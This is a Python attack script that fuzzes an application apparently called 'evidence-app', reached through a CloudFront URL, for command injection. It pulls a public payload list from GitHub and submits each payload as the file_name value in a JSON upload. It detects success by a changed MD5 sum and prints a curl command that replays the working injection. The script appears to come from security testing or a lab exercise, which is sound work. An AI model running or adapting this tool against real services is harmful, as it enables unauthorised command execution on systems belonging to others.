#!/usr/bin/python3

"""
Python script to fuzz evidence-app
"""

import argparse
import json
import requests

def get_fuzz_list():
    """
    Gets list of payloads from https://github.com/payloadbox/command-injection-payload-list.
    """
    response = requests.get("https://raw.githubusercontent.com/payloadbox/command-injection-payload-list/master/README.md")
    fuzz_list = []
    start = False
    for line in response.text.split("\n"):
        if line == "```":
            start = not start
        if start and line != "```" and not "root@ismailtasdelen" in line:
            fuzz_list.append(line)
    return fuzz_list

def upload_file(file_name, target):
    """
    Upload fuzzed file_name with file_data of dGVzdAo= (test).
    """
    post_data = "{\"file_name\":\"" + file_name + "\",\"file_data\":\"dGVzdAo=\"}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    response = requests.post(target, headers=headers, data=post_data)
    return response.text

def check_response(file_name, target):
    """
    Check result of uploaded file_name.
    """
    response = requests.get(target)
    json_data = json.loads(response.text.replace("'", '"'))
    for item in json_data['Items']:
        if item['FileName']['S'] == file_name and item['MD5Sum']['S'] != "d8e8fca2dc0f896fd7cb4cb0031ba249":
            return True
    return False

def main():
    """
    Main function
    """
    parser = argparse.ArgumentParser(description="Performs command injection against CloudFront URL.")
    parser.add_argument("--target", metavar="CLOUDFRONT_URL", type=str, \
        help="Target web page", required=True)
    args = parser.parse_args()
    fuzz_list = get_fuzz_list()
    for fuzz in fuzz_list:
        response = upload_file(fuzz, args.target)
        if response == "Success":
            if check_response(fuzz, args.target):
                print("\033[32m" + fuzz + "\033[0m worked as command injection for the file_name parameter!")
                print("  Here is a curl command:\n  \033[32mcurl -X POST " + args.target + " -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{\"file_name\":\"" + fuzz + "\",\"file_data\":\"dGVzdAo=\"}'\033[0m")
                break

if __name__ == "__main__":
    main()
